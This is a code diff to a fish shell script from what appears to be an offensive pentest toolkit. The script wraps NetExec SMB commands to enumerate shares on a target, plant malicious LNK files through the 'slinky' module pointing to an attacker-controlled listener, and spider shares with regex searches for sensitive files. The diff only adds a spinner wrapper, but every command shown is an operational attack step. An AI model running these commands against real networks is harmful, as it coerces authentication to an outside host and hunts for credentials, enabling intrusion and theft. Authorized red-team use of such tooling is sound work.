@@ -148,7 +148,7 @@ Examples:
         ezpz_header "Enumerating non-default shares on $target"
         ezpz_cmd "nxc smb $target $nxc_auth --shares"
         
-        timeout 600 nxc smb $target $nxc_auth --shares 2>/dev/null | grep -v '\[.\]' | tail -n +3 | tr -s " " | cut -d " " -f 5- > $shares_tmp
+        ezpz_spin timeout 600 nxc smb $target $nxc_auth --shares | grep -v '\[.\]' | tail -n +3 | tr -s " " | cut -d " " -f 5- > $shares_tmp
         
         if test $pipestatus[1] -eq 124
             ezpz_warn "Operation timed out. Skipping $target."
@@ -242,7 +242,7 @@ Examples:
                     ezpz_header "Creating malicious LNK files on WRITE shares"
                     ezpz_cmd "nxc smb $target $nxc_auth -M slinky -o NAME='bad' SERVER=$listener"
                     
-                    nxc smb $target $nxc_auth -M slinky -o NAME='bad' SERVER=$listener 2>/dev/null | grep SLINKY | grep -oE '(Created.*|Error.*)'
+                    ezpz_spin nxc smb $target $nxc_auth -M slinky -o NAME='bad' SERVER=$listener | grep SLINKY | grep -oE '(Created.*|Error.*)'
                 end
             end
         end
@@ -285,7 +285,7 @@ Examples:
             ezpz_header "Searching '$share' for $search_desc"
             ezpz_cmd "nxc smb $target $nxc_auth --spider $share --regex '$regex_pattern'"
             
-            nxc smb $target $nxc_auth --spider $share --regex $regex_pattern 2>/dev/null | grep -v '\[.\]' | grep -v '\[dir\]' | tr -s " " | cut -d " " -f 5- | cut -d '[' -f 1 | sed 's/[[:space:]]*$//' | tee $files_tmp
+            ezpz_spin nxc smb $target $nxc_auth --spider $share --regex $regex_pattern | grep -v '\[.\]' | grep -v '\[dir\]' | tr -s " " | cut -d " " -f 5- | cut -d '[' -f 1 | sed 's/[[:space:]]*$//' | tee $files_tmp
                 
                 if test $pipestatus[1] -eq 124
                     ezpz_warn "Operation timed out. Skipping spider for $share."
